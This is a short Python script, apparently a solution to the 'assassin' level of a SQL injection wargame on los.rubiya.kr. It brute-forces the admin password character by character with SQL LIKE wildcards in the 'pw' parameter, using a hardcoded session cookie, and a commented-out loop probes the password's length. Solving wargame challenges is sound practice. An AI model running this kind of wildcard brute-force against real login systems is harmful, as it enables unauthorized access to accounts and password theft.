import requests
import string

for i in string.printable:
    url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
    cookie = {'PHPSESSID': '0g1kdbrd3sou7ii7l6lppo2hrs'}
    #param = {"pw":f"{i}________"}
    str = "90" + i + ("_" * 5)
    param = {"pw":f"{str}"}
    req = requests.get(url, cookies=cookie, params=param)
    print(i)
    if "Hello admin" in req.text:
        print(i+"find")

# for i in range(50):
#     url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
#     cookie = {'PHPSESSID': '0g1kdbrd3sou7ii7l6lppo2hrs'}
#     str = "_" * i
#     param = {"pw":f"{str}"}
#     req = requests.get(url, cookies=cookie, params=param)
#     print(str)
#     if "Hello admin" in req.text:
#         print(i+"find")